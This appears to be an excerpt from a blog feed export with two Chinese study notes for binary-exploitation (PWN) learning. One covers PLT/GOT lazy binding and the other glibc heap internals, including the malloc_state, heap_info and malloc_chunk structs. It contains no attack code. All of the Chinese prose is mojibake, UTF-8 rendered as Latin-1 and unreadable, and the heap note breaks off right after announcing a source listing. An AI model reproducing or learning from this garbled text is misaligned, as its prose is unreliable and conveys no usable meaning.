<h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>1.<strong>PLT[0]å¤„åˆ°åº•åšäº†ä»€ä¹ˆï¼ŒæŒ‰ç…§æˆ‘ä»¬ä¹‹å‰çš„æ€è·¯å®ƒä¸æ˜¯åº”è¯¥è·³è½¬åˆ°GOT[0]å—</strong></p>
<p>è¿™æ˜¯plt[0]ä¸­çš„å†…å®¹</p>
<p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201217082532501.png" alt="image-20201217082532501"></p>
<p>åé¢çš„16è¿›åˆ¶å°±æ˜¯GOTè¡¨ä¸­çš„å†…å®¹</p>
<blockquote>
<p><strong>æˆ‘ä»¬çš„PLT[0]æ ¹æœ¬æ²¡æœ‰è·³è½¬åˆ°GOT[0]ï¼Œå®ƒä¸åƒæˆ‘ä»¬çš„PLT[1]è¿™äº›å­˜å‚¨çš„æ˜¯GOTè¡¨é¡¹çš„åœ°å€ï¼Œå®ƒæ˜¯ä¸€äº›ä»£ç æŒ‡ä»¤ï¼Œæ¢å¥è¯è¯´ï¼ŒPLT[0]æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯é€šè¿‡GOT[1]å’ŒGOT[2]æ¥æ­£ç¡®ç»‘å®šä¸€ä¸ªå‡½æ•°çš„æ­£å¼åœ°å€åˆ°GOTè¡¨ä¸­æ¥ã€‚</strong></p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹é¢è¿™å¼ å›¾</p>
<p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123155535419" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p>
<p>è€Œplt[0]ä»£ç åšçš„äº‹æƒ…åˆ™æ˜¯ï¼šç”±äºGOT[2]ä¸­å­˜å‚¨çš„æ˜¯åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£åœ°å€ï¼Œæ‰€ä»¥é€šè¿‡<strong>GOT[1]ä¸­çš„æ•°æ®ä½œä¸ºå‚æ•°ï¼Œè·³è½¬åˆ°GOT[2]æ‰€å¯¹åº”çš„å‡½æ•°å…¥å£åœ°å€ï¼Œè¿™ä¸ªåŠ¨æ€é“¾æ¥å™¨ä¼šå°†ä¸€ä¸ªå‡½æ•°çš„çœŸæ­£åœ°å€ç»‘å®šåˆ°ç›¸åº”çš„GOT[x]ä¸­ã€‚</strong></p>
<p>æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡PLTè¡¨è°ƒç”¨ï¼Œä¸€ä¸ªåˆ™æ˜¯é€šè¿‡GOTè¡¨è°ƒç”¨ï¼Œ<strong>å› ä¸ºPLTè¡¨æœ€ç»ˆä¹Ÿæ˜¯è·³è½¬GOTè¡¨ï¼ŒGOTè¡¨ä¸­åˆ™æ˜¯ä¸€ä¸ªå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸€ä¸ªå‡½æ•°æ²¡æœ‰è¿è¡Œä¸€æ¬¡ä¹‹å‰ï¼ŒGOTè¡¨ä¸­çš„æ•°æ®ä¸º@pltå‡½æ•°ä¸­ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</strong></p>
<p>2.<strong>ä¸ºä»€ä¹ˆä¸­é—´è¦è¿›è¡Œpushå‹æ ˆæ“ä½œï¼Ÿ</strong></p>
<p>ä¸­é—´è¿›è¡Œçš„å‹æ ˆæ˜¯ä¸ºäº†ç¡®å®šPLTå¯¹åº”çš„GOTè¡¨é¡¹ï¼Œå³æ˜¯PLT[1]âˆ’&gt;GOT[3]ï¼Œ0x3å°±æ˜¯GOTçš„ä¸‹æ ‡3ï¼Œä¹Ÿå°±æ˜¯è¯´å‹æ ˆåæˆ‘ä»¬è·³è½¬åˆ°PLT[0],æ¥ç€PLT[0]ä¸­çš„æŒ‡ä»¤ä¼šé€šè¿‡è¿™æ¬¡å‹æ ˆçš„åºå·æ¥ç¡®å®šæ“ä½œçš„GOTè¡¨é¡¹ä¸ºå¤šå°‘</p>
<p>3.<strong>å‹å…¥çš„åºå·ä¸ºä»€ä¹ˆä¸º0x3ï¼Œä¸æ˜¯æœ€å¼€å§‹åº”è¯¥ä¸º0x0å—ï¼Ÿ</strong></p>
<p>å› ä¸ºGOT[0],GOT[1],GOT[2]éƒ½æœ‰å…¶ä»–ç”¨å¤„ï¼Œæ‰€ä»¥ä»0x3å¼€å§‹ã€‚</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><h2 id="GOTè¡¨çš„æ„æˆ"><a href="#GOTè¡¨çš„æ„æˆ" class="headerlink" title="GOTè¡¨çš„æ„æˆ"></a>GOTè¡¨çš„æ„æˆ</h2><p>GOT[0]åŒ…å«.dynamicæ®µçš„åœ°å€ï¼Œ.dynamicæ®µåŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨ç”¨æ¥ç»‘å®šè¿‡ç¨‹åœ°å€çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç¬¦å·çš„ä½ç½®å’Œé‡å®šä½ä¿¡æ¯;</p>
<p>GOT[1]åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„æ ‡è¯†;</p>
<p>GOT[2]åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„å»¶è¿Ÿç»‘å®šä»£ç çš„å…¥å£ç‚¹ã€‚</p>
<p>GOTçš„å…¶ä»–è¡¨ç›®ä¸ºæœ¬æ¨¡å—è¦å¼•ç”¨çš„ä¸€ä¸ªå…¨å±€å˜é‡æˆ–å‡½æ•°çš„åœ°å€ã€‚</p>
<h2 id="PLTè¡¨çš„æ„æˆ"><a href="#PLTè¡¨çš„æ„æˆ" class="headerlink" title="PLTè¡¨çš„æ„æˆ"></a>PLTè¡¨çš„æ„æˆ</h2><p>PLTè¡¨å¹¶ä¸æ˜¯æ¯ä¸ªè¡¨é¡¹éƒ½ç”¨äºå­˜æ”¾â€œå‡½æ•°åœ°å€â€œï¼Œå…¶ä¸­PLT[0]æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¡¨ç›®ï¼Œå®ƒè·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ä¸­æ‰§è¡Œï¼Œæ¢å¥è¯è¯´ï¼ŒPLT[0]æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯é€šè¿‡GOT[1]å’ŒGOT[2]æ¥æ­£ç¡®ç»‘å®šä¸€ä¸ªå‡½æ•°çš„æ­£å¼åœ°å€åˆ°GOTè¡¨ä¸­æ¥ã€‚</p>
<h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>æœ€åï¼Œè‡ªå·±æ€»ç»“ä¸€ä¸‹å®ç°è¿‡ç¨‹</p>
<ol>
<li>é¦–å…ˆï¼Œè¿›å…¥PLTè¡¨é¡¹ï¼Œè¿™æ—¶ç¬¬ä¸€æ­¥å°±æ˜¯è·³è½¬åˆ°GOTè¡¨é¡¹</li>
<li>GOTè¡¨é¡¹å­˜æ”¾PLTè¡¨ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯<code>push 0x x</code>æŠŠç›¸åº”çš„idxå‹å…¥</li>
<li>ä¸‹ä¸€æ­¥å°±æ˜¯è·³è½¬åˆ°PLT[0]ä¸­ï¼Œè¿›è€Œé“¾æ¥åˆ°GOT[2] ,è¿›å…¥é“¾æ¥å™¨å…¥å£</li>
<li>æœ€åé€šè¿‡åŠ¨æ€é“¾æ¥å™¨å°†çœŸæ­£å‡½æ•°åœ°å€è¦†ç›–åˆ°GOTè¡¨ä¸­</li>
</ol>
<p>åˆ«äººçš„åŠ¨å›¾</p>
<p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20200208160601515.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>å †</title>
    <url>/2020/12/15/%E5%A0%86/</url>
    <content><![CDATA[<h1 id="å †-æŒç»­æ›´æ–°"><a href="#å †-æŒç»­æ›´æ–°" class="headerlink" title="å †(æŒç»­æ›´æ–°)"></a>å †(æŒç»­æ›´æ–°)</h1><p><a href="https://ld1ng.com/2020/07/23/Heap/" target="_blank" rel="noopener">https://ld1ng.com/2020/07/23/Heap/</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap</a></p>
<p>ä¸Šä¸€ä¸ªPWNå­¦ä¹  å­¦å¾—ä¸å¤ªå…¨é¢</p>
<p>å†™è¿™ä¸ªä¸»è¦æ˜¯ä¸ºäº†è‡ªå·±èƒ½å¤Ÿå…¨é¢å¤ä¹ å †çš„åŸºç¡€çŸ¥è¯†</p>
<p>ç”±äºæˆ‘æ²¡å­¦è¿‡æ“ä½œç³»ç»Ÿ æœ‰äº›ç›¸å…³çŸ¥è¯†å¯èƒ½ä¸å¤ªå¯¹ è¿˜è¯·æŒ‡æ­£</p>
<h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="0x01-ä»€ä¹ˆæ˜¯å †"><a href="#0x01-ä»€ä¹ˆæ˜¯å †" class="headerlink" title="0x01 ä»€ä¹ˆæ˜¯å †"></a>0x01 ä»€ä¹ˆæ˜¯å †</h3><ul>
<li>åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜</li>
<li>å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå®ƒç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿</li>
<li>æˆ‘ä»¬ä¸€èˆ¬æˆç®¡ç†å †çš„é‚£éƒ¨åˆ†ç¨‹åºä¸ºå †ç®¡ç†å™¨</li>
</ul>
<p>å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œ</p>
<ul>
<li>malloc</li>
<li>free</li>
</ul>
<h3 id="0x02-å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †"><a href="#0x02-å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †" class="headerlink" title="0x02 å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †"></a>0x02 å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †</h3><h4 id="1-mallocå‡½æ•°"><a href="#1-mallocå‡½æ•°" class="headerlink" title="1.mallocå‡½æ•°"></a>1.<strong>mallocå‡½æ•°</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>è¯¥å‡½æ•°è¿”å›å¯¹åº”å¤§å°å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆ</li>
<li>æ­¤å¤–ï¼Œè¯¥å‡½æ•°è¿˜å¯¹ä¸€äº›å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†å¤„ç†</li>
<li>å½“n=0æ—¶ï¼Œè¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å—</li>
<li><strong>å½“nä¸ºè´Ÿæ•°æ—¶ï¼Œç”±äºåœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œsize_tæ˜¯æ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥ç¨‹åºå°±ä¼šç”³è¯·å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œä½†é€šå¸¸æ¥è¯´éƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é…</strong></li>
</ul>
<h4 id="2-freeå‡½æ•°"><a href="#2-freeå‡½æ•°" class="headerlink" title="2.freeå‡½æ•°"></a>2.<strong>freeå‡½æ•°</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>è¯¥å‡½æ•°ä¼šé‡Šæ”¾ç”±pæ‰€æŒ‡å‘çš„å†…å­˜å—ã€‚è¿™ä¸ªå†…å­˜å—æœ‰å¯èƒ½æ˜¯é€šè¿‡mallocå‡½æ•°å¾—åˆ°çš„ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯é€šè¿‡ç›¸å…³çš„å‡½æ•°reallocå¾—åˆ°çš„</li>
</ul>
<p>è¯¥å‡½æ•°è¿˜å¯¹å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†ä¸€ä¸‹å¤„ç†</p>
<ul>
<li>å½“pä¸ºç©ºæŒ‡é’ˆæ—¶ï¼Œå‡½æ•°ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</li>
<li>å½“på·²ç»è¢«é‡Šæ”¾ä¹‹åï¼Œå†æ¬¡é‡Šæ”¾ä¼šå‡ºç°é”™è¯¯çš„æ•ˆæœï¼Œè¿™å…¶å®å°±æ˜¯double free</li>
<li>é™¤äº†è¢«ç¦ç”¨ï¼ˆmallocptï¼‰çš„æƒ…å†µä¸‹ï¼Œå½“é‡Šæ”¾å¾ˆå¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œç¨‹åºä¼šå°†è¿™äº›å†…å­˜ç©ºé—´è¿˜ç»™ç³»ç»Ÿï¼Œä»¥ä¾¿å‡å°ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´</li>
</ul>
<h3 id="0x03-å¦‚ä½•å®ç°å †"><a href="#0x03-å¦‚ä½•å®ç°å †" class="headerlink" title="0x03 å¦‚ä½•å®ç°å †"></a>0x03 å¦‚ä½•å®ç°å †</h3><ul>
<li>å †çš„glibcå®ç°ä¸»è¦åŒ…æ‹¬struct _heap_infoï¼Œstruct malloc_stateï¼Œstruct malloc_chunkè¿™3ä¸ªç»“æ„ä½“</li>
</ul>
<h4 id="1-Arena"><a href="#1-Arena" class="headerlink" title="1.Arena"></a>1.Arena</h4><p><img src="/2020/12/15/%E5%A0%86/image-20201212002041969.png" alt="image-20201212002041969"></p>
<blockquote>
<ul>
<li>ä¸€ä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ªarneaï¼Œå¹¶ä¸”è¿™äº›çº¿ç¨‹çš„arneaéƒ½æ˜¯ç‹¬ç«‹çš„ä¸æ˜¯ç›¸åŒçš„</li>
<li>ä¸»çº¿ç¨‹çš„arneaç§°ä¸ºâ€œmain_arenaâ€ã€‚å­çº¿ç¨‹çš„arneaç§°ä¸ºâ€œthread_arenaâ€</li>
</ul>
</blockquote>
<h5 id="Arenaçš„æ•°é‡åŠç®¡ç†"><a href="#Arenaçš„æ•°é‡åŠç®¡ç†" class="headerlink" title="Arenaçš„æ•°é‡åŠç®¡ç†"></a>Arenaçš„æ•°é‡åŠç®¡ç†</h5><p>æˆ‘ä»¬è¯´åˆ°æœ‰ä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹çš„arena</p>
<p><strong>é‚£ä¹ˆæ¯ä¸ªç¨‹åºçš„arenaçš„æ•°é‡åº”è¯¥å°±æ˜¯æœ‰é™çš„</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">32</span>ä½ç³»ç»Ÿä¸­ï¼š</span><br><span class="line">     Number of arena = <span class="number">2</span> * number of cores + <span class="number">1.</span></span><br><span class="line"><span class="number">64</span>ä½ç³»ç»Ÿä¸­ï¼š</span><br><span class="line">     Number of arena = <span class="number">8</span> * number of cores + <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå°±ä¼šæ¶‰åŠä¸€ä¸ªå¤šçº¿ç¨‹å…±äº«é—®é¢˜</p>
<blockquote>
<p>egï¼šä¸€ä¸ªä¸»Arena ä¸¤ä¸ªå‰¯Arena</p>
<p>å¦‚æœæœ‰ä¸€ä¸ª4çº¿ç¨‹ï¼ˆå¤§äº3ä¸ªArenaï¼‰çš„ç¨‹åºï¼Œæ˜¾ç„¶è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªå…±äº«é—®é¢˜</p>
<p><strong>æ­¤æ—¶glibc mallocä¼šåšä»¥ä¸‹æ“ä½œï¼š</strong></p>
<ul>
<li>é¦–å…ˆï¼Œglibc mallocå¾ªç¯éå†æ‰€æœ‰å¯ç”¨çš„ç«æŠ€åœºï¼Œåœ¨éå†çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šå°è¯•é”è¯¥ç«æŠ€åœºã€‚å¦‚æœæˆåŠŸé”ï¼ˆè¯¥ç«æŠ€åœºå½“å‰å¯¹åº”çš„çº¿ç¨‹å¹¶æœªä½¿ç”¨å †å†…å­˜åˆ™è¡¨ç¤ºå¯é”ï¼‰ï¼Œé‚£ä¹ˆè¯¥ç«æŠ€åœºå°±å¯ä»¥è¢«çº¿ç¨‹3æ‰€ä½¿ç”¨</li>
<li>è€Œå¦‚æœæ²¡èƒ½æ‰¾åˆ°å¯ç”¨çš„èˆå°ä¸Šï¼Œé‚£ä¹ˆå°±å°†çº¿ç¨‹3çš„mallocçš„æ“ä½œé˜»å¡ï¼Œç›´åˆ°æœ‰å¯ç”¨çš„èˆå°ä¸ºæ­¢</li>
<li>å½“çº¿ç¨‹3çš„mallocé˜»å¡è§£é™¤æ—¶ï¼Œglibc mallocå°±ä¼šå…ˆå°è¯•ä½¿ç”¨æœ€è¿‘è®¿é—®çš„ç«æŠ€åœºï¼ˆæ­¤æ—¶ä¸ºä¸»ç«æŠ€åœºï¼‰ã€‚å¦‚æœæ­¤æ—¶ä¸»ç«æŠ€åœºå¯ç”¨çš„è¯ï¼Œå°±ç›´æ¥ä½¿ç”¨ï¼Œå¦åˆ™å°±å°†çº¿ç¨‹3å†æ¬¡é˜»å¡ï¼Œç›´åˆ°ä¸»èˆå°ä¸Šå†æ¬¡å¯ç”¨ä¸ºæ­¢</li>
</ul>
</blockquote>
<h4 id="2-malloc-state"><a href="#2-malloc-state" class="headerlink" title="2.malloc_state"></a>2.<strong>malloc_state</strong></h4><ul>
<li>glibcçš„ä¸­arneaå°±æ˜¯ç”¨è¿™ä¸ªç»“æ„ä½“è¡¨ç¤ºçš„</li>
<li>å…¶ä¸­åŒ…å«å¾ˆå¤šçš„ä¿¡æ¯ï¼šå„ç§binsçš„ä¿¡æ¯ï¼Œtop chunkä»¥åŠæœ€åä¸€ä¸ªå‰©ä½™chunkç­‰</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><strong>fastbinsYæ•°ç»„ï¼š</strong>å­˜å‚¨çš„æ˜¯è¯¥é¢†åŸŸç®¡ç†çš„fastbins</li>
<li><strong>binsæ•°ç»„ï¼š</strong>å­˜å‚¨çš„æ˜¯è¯¥é¢†åŸŸç®¡ç†çš„smallbinsï¼Œunsortedbinï¼Œlargebin</li>
<li><strong>binmapå˜é‡ï¼š</strong>ç³»ç»ŸæŸ¥çœ‹æœ‰å“ªäº›åƒåœ¾ç®±é“¾ä¸­æœ‰å—æ—¶ï¼Œä¸å¯èƒ½å»fastbinsYå’Œç®±æ•°ç»„ä¸€ä¸ªä¸€ä¸ªçš„éå†é€šè¿‡binmapå˜é‡ï¼Œé‡‡ç”¨äºŒè¿›åˆ¶å­˜å‚¨ï¼Œå°†äºŒè¿›åˆ¶ä½ä¸æ•°ç»„çš„ç´¢å¼•ç›¸å¯¹ï¼Œç³»ç»ŸæŸ¥æ‰¾ç®±é“¾æ—¶å¯ä»¥ã€‚é€šè¿‡æŒ‰ä½ä¸æ¥æŸ¥è¯¢ï¼Œè¿™æ ·æ›´é«˜æ•ˆã€‚è™½ç„¶unsigned intçš„äºŒè¿›åˆ¶ä½æ¯”æ•°ç»„æ€»å…ƒç´ å°‘ï¼Œä½†æ˜¯ç³»ç»Ÿä¸ä¼šæœ‰é‚£ä¹ˆå¤šçš„biné“¾ï¼Œä¸éœ€è¦è€ƒè™‘è¿™ä¸ªé—®é¢˜</li>
</ul>
</blockquote>
<h4 id="3-heap-info"><a href="#3-heap-info" class="headerlink" title="3.heap_info"></a>3.<strong>heap_info</strong></h4><ul>
<li>æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åŒ…å«å¤šä¸ªå †æ®µï¼Œè¿™äº›å †æ®µåŒå±äºä¸€ä¸ªèˆå°æ¥ç®¡ç†ã€‚æ¯ä¸ªå †æ®µçš„ä¿¡æ¯å°±æ˜¯ç”¨è¿™ä¸ªç»“æ„ä½“æ¥è¡¨ç¤ºçš„</li>
<li><strong>æ³¨æ„ï¼š</strong>è¿™ä¸ªä¸æ˜¯å­˜å‚¨å †å—çš„æ•°æ®ï¼Œè€Œæ˜¯æ¥è§£é‡Šè¯´æ˜è¿™ä¸ªå †æ®µçš„</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr;            <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span>  <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>;              <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size;     <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                             PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><strong>ar_ptrï¼š</strong>æ­¤å †æ®µå½’å±äºå“ªä¸€ä¸ªarneaç®¡ç†</li>
<li><strong>prevï¼š</strong>å‰ä¸€ä¸ªå †æ®µ</li>
</ul>
</blockquote>
<h4 id="4-malloc-chunk"><a href="#4-malloc-chunk" class="headerlink" title="4.malloc_chunk"></a>4.malloc_chunk</h4><ul>
<li>ä¸€ä¸ªå †å—è¢«åˆ†ä¸ºå¤šä¸ªå—ï¼Œè¿™äº›å—å°±æ˜¯ç”¨è¿™äº›ç»“æ„ä½“è¡¨ç¤ºçš„ï¼Œè¿™ä¸ªæ‰æ˜¯æˆ‘ä»¬åœ¨glibcçš„æ­£çœŸå­˜å‚¨å †æ•°æ®ä¿¡æ¯çš„ç»“æ„ä½“</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).*/</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead.*/</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>   <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><p>æ¯ä¸ªæˆå‘˜éƒ½æ˜¯8å­—èŠ‚ï¼ˆ64ä½ç³»ç»Ÿä¸­ï¼‰ï¼Œ4å­—èŠ‚ï¼ˆ32ä½ç³»ç»Ÿä¸­ï¼‰</p>
</li>
<li><p><strong>mchunk_prev_sizeï¼š</strong>åªæœ‰å½“è¯¥chunkçš„ç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€chunkæ˜¯ç©ºé—²çš„è¯ï¼Œè¯¥å­—æ®µåœ¨æœ¬chunkä¸­æ‰æœ‰ç”¨ï¼Œç”¨æ¥è®°å½•å‰ä¸€ä¸ªchunk çš„å¤§å° (åŒ…æ‹¬chunkå¤´)ã€‚å¦åˆ™ï¼Œè¯¥å­—æ®µä¸º0æ˜¯æ²¡æœ‰ç”¨çš„ï¼›ä½†æ˜¯å½“å‰ä¸€ä¸ªchunkç”³è¯·çš„å¤§å°å¤§äºå‰ä¸€ä¸ªchunkçš„å¤§å°æ—¶ï¼Œé‚£ä¹ˆè¯¥å­—æ®µå¯ä»¥ç”¨æ¥ç»™å‰ä¸€ä¸ªchunkä½¿ç”¨ï¼ˆè¿™å°±æ˜¯chunkçš„ç©ºé—´å¤ç”¨ï¼Œåé¢æ–‡ç« ä»‹ç»ï¼‰</p>
</li>
<li><strong>mchunk_sizeï¼š</strong>å½“å‰chunkçš„å¤§å°ï¼Œchunkå¤§å°éƒ½æ˜¯8å­—èŠ‚å¯¹é½</li>
</ul>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹gdbè°ƒè¯•çš„ç•Œé¢</p>
<p>æºç å¦‚ä¸‹</p>
